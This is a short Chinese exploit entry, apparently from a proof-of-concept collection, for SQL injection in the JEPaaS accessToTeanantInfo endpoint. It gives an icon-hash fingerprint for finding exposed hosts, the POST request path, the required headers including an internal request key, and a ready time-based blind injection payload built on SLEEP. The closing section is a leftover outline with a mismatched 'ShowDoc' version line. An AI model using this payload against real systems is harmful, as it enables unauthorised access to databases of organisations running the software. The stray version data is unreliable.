# JEPaaSaccessToTeanantInfo存在SQL注入漏洞

- **系统**：JEPaaSaccessToTeanantInfo　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="-999810473"`
- **请求**：`POST /rbac/im/accessToTeanantInfo HTTP/1.1`
- **关键头**：`Content-Length: 64`　`Content-Type: application/x-www-form-urlencoded`　`internalRequestKey: schedule_898901212`

**请求体 / payload**
```
tenantId=1' AND (SELECT 2805 FROM (SELECT(SLEEP(3)))moYz)-- sBPi
```

**其他**
- JEPaaS accessToTeanantInfo存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * ShowDoc